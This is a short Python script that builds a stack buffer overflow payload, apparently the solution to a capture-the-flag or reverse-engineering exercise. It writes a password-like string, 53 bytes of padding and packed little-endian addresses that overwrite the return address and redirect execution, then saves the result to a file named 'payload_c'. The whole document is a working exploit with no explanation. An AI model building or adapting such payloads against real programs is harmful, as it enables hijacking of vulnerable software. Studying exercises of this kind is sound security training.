import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

offset = 53

payload=''
payload+='NOP\n'
payload+='IDA_1z_y0ur_fr1end\n'

payload += 'A' * offset

payload += dw(0x00000194)
payload +='A'*12

payload += dw(0x6ff6b2c4)

payload += dw(0x00401250)

payload += dw(0x0040a184)
payload += dw(0x0040a18f)


with open('payload_c', 'wb') as f:
    f.write(payload)
